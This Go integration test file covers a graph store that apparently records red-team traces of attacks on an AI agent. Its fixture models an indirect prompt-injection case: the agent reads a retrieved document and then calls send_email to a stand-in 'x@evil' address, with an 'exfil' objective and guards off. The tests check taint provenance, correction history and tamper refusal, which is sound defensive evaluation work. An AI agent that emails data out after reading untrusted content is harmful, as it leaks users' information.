package graph

import (
	"context"
	"fmt"
	"testing"
	"time"

	"github.com/41vi4p/avhsol/core/internal/trace"
)

// Integration tests run against the real Neo4j from scripts/stack.sh and skip when it is not up.
func openOrSkip(t *testing.T) (*Store, context.Context) {
	t.Helper()
	ctx := context.Background()
	st, err := Open(ctx, LoadConfig())
	if err != nil {
		t.Skipf("Neo4j not available: %v", err)
	}
	t.Cleanup(func() { st.Close(ctx) })
	if err := st.EnsureSchema(ctx); err != nil {
		t.Fatal(err)
	}
	return st, ctx
}

func cleanup(t *testing.T, st *Store, ctx context.Context, prefix string) {
	t.Cleanup(func() {
		_ = st.write(ctx, []stmt{
			{"MATCH (n) WHERE (n:Episode OR n:Step OR n:Finding) AND n.id STARTS WITH $p DETACH DELETE n", map[string]any{"p": prefix}},
			{"MATCH (o:Objective) WHERE o.id STARTS WITH $p DETACH DELETE o", map[string]any{"p": prefix}},
			{"MATCH (n) WHERE (n:Payload OR n:Resource OR n:Agent OR n:Technique) AND n.id STARTS WITH $p DETACH DELETE n", map[string]any{"p": prefix}},
		})
	})
}

func fakeTrace(id string, success bool) *trace.Trace {
	tr := &trace.Trace{TraceID: id, ScenarioID: id + "-sc", Target: "t", Model: "m", Kind: "attack", GuardMode: "off",
		StartedAt: time.Now(), DurationMs: 10, Success: success,
		Attack:   &trace.Attack{SeedID: "s", Technique: id + "-tech", Surface: "doc", Payload: "payload " + id},
		Verdicts: []trace.Verdict{{ObjectiveID: "exfil", Success: success, Severity: "critical", Evidence: "first opinion"}}}
	_, _ = tr.Append(trace.StepUserTurn, time.Now().UnixMilli(), map[string]any{"text": "do the task"})
	_, _ = tr.Append(trace.StepToolCall, time.Now().UnixMilli(), map[string]any{"id": "c1", "name": "read_document", "args": map[string]any{"doc_id": "doc"}})
	_, _ = tr.Append(trace.StepToolResult, time.Now().UnixMilli(), map[string]any{"id": "c1", "content": "text", "source": "retrieved:doc"})
	_, _ = tr.Append(trace.StepToolCall, time.Now().UnixMilli(), map[string]any{"id": "c2", "name": "send_email", "args": map[string]any{"to": "x@evil"}})
	return tr
}

func TestCorrectionSupersedesAndKeepsHistoryAsOf(t *testing.T) {
	st, ctx := openOrSkip(t)
	id := fmt.Sprintf("itest-%d", time.Now().UnixNano())
	cleanup(t, st, ctx, id)
	if _, err := st.IngestTrace(ctx, fakeTrace(id, true), nil, nil); err != nil {
		t.Fatal(err)
	}
	then := time.Now().UnixMilli()
	time.Sleep(20 * time.Millisecond)
	changed, err := st.Correct(ctx, id, "exfil", false, "reviewer: the email went to an internal alias", "alice", "false positive")
	if err != nil || !changed {
		t.Fatalf("changed=%v err=%v", changed, err)
	}
	now, _ := st.Beliefs(ctx, id, Clock{})
	if len(now) != 1 || now[0].Success {
		t.Fatalf("current belief must be the correction: %+v", now)
	}
	past, _ := st.Beliefs(ctx, id, Clock{AsOf: &then})
	if len(past) != 1 || !past[0].Success {
		t.Fatalf("as of before the correction we believed the exploit worked: %+v", past)
	}
	hist, _ := st.History(ctx, id)
	if len(hist) != 2 || hist[0].RecTo == nil || *hist[0].RecTo != hist[1].RecFrom {
		t.Fatalf("old version must be closed exactly when the new one opens: %+v", hist)
	}
	before := time.UnixMilli(then).Add(-time.Hour).UnixMilli()
	if none, _ := st.Beliefs(ctx, id, Clock{AsOf: &before}); len(none) != 0 {
		t.Fatalf("before we had recorded anything there is nothing to believe: %+v", none)
	}
	if again, _ := st.Correct(ctx, id, "exfil", false, "reviewer: the email went to an internal alias", "alice", "x"); again {
		t.Fatal("repeating the same correction must be a no-op")
	}
}

func TestIngestIsIdempotentAndRefusesTamperedReuse(t *testing.T) {
	st, ctx := openOrSkip(t)
	id := fmt.Sprintf("itest-%d", time.Now().UnixNano())
	cleanup(t, st, ctx, id)
	tr := fakeTrace(id, true)
	if _, err := st.IngestTrace(ctx, tr, nil, nil); err != nil {
		t.Fatal(err)
	}
	if s, err := st.IngestTrace(ctx, tr, nil, nil); err != nil || !s.Unchanged {
		t.Fatalf("second ingest must be a no-op: %+v %v", s, err)
	}
	other := fakeTrace(id, true)
	_, _ = other.Append(trace.StepToolCall, 1, map[string]any{"id": "c3", "name": "bash"})
	if _, err := st.IngestTrace(ctx, other, nil, nil); err == nil {
		t.Fatal("same trace id with different content must be refused")
	}
	broken := fakeTrace(id+"b", true)
	broken.Steps[1].Data["name"] = "tampered"
	if _, err := st.IngestTrace(ctx, broken, nil, nil); err == nil {
		t.Fatal("a trace with a broken hash chain must be refused")
	}
}

func TestProvenanceEdgesLinkReadToLaterCalls(t *testing.T) {
	st, ctx := openOrSkip(t)
	id := fmt.Sprintf("itest-%d", time.Now().UnixNano())
	cleanup(t, st, ctx, id)
	if _, err := st.IngestTrace(ctx, fakeTrace(id, true), nil, nil); err != nil {
		t.Fatal(err)
	}
	path, err := st.Why(ctx, id)
	if err != nil {
		t.Fatal(err)
	}
	var tainted bool
	for _, p := range path {
		if p.Name == "send_email" && p.TaintedBy != nil && *p.TaintedBy == 2 {
			tainted = true
		}
	}
	if !tainted {
		t.Fatalf("the call after the untrusted read must be tainted by it: %+v", path)
	}
}
